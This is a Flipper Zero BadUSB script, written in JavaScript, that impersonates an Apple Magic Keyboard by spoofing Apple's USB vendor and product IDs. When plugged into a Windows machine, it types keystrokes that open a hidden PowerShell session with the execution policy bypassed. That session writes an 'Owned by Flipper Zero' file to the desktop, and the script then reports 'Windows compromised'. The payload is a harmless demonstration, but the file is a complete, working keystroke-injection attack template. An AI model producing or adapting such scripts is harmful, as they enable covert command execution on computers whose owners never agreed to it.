let badusb = require("badusb");
let notify = require("notification");
let flipper = require("flipper");
let eventLoop = require("event_loop");
let gui = require("gui");
let dialog = require("gui/dialog");

let views = {
    dialog: dialog.makeWith({
        header: "BadUSB Windows Test",
        text: "Press OK to start",
        center: "Start",
    }),
};

badusb.setup({
    vid: 0x05AC,  // Apple's actual VID
    pid: 0x0250,  // Apple Keyboard PID
    mfrName: "Apple Inc.",
    prodName: "Magic Keyboard",
    layoutPath: "/ext/badusb/assets/layouts/en-US.kl"
});

eventLoop.subscribe(views.dialog.input, function (_sub, button, eventLoop, gui) {
    if (button !== "center")
        return;

    gui.viewDispatcher.sendTo("back");

    if (badusb.isConnected()) {
        notify.blink("green", "short");
        print("Executing Windows payload...");
        badusb.press("GUI", "r");
        delay(750);
        badusb.println("powershell -WindowStyle Hidden -NoP -Ep Bypass");
        delay(1500);
        badusb.println("echo 'Owned by Flipper Zero - " + flipper.getName() + "' > $env:USERPROFILE\\Desktop\\exploited_win.txt");
        delay(500);
        badusb.println("exit");
        badusb.press("ALT", "F4");
        notify.success();
        print("Windows compromised");
    } else {
        print("USB not connected");
        notify.error();
    }

    eventLoop.stop();
}, eventLoop, gui);

eventLoop.subscribe(gui.viewDispatcher.navigation, function (_sub, _item, eventLoop) {
    eventLoop.stop();
}, eventLoop);

gui.viewDispatcher.switchTo(views.dialog);
eventLoop.run();
badusb.quit();
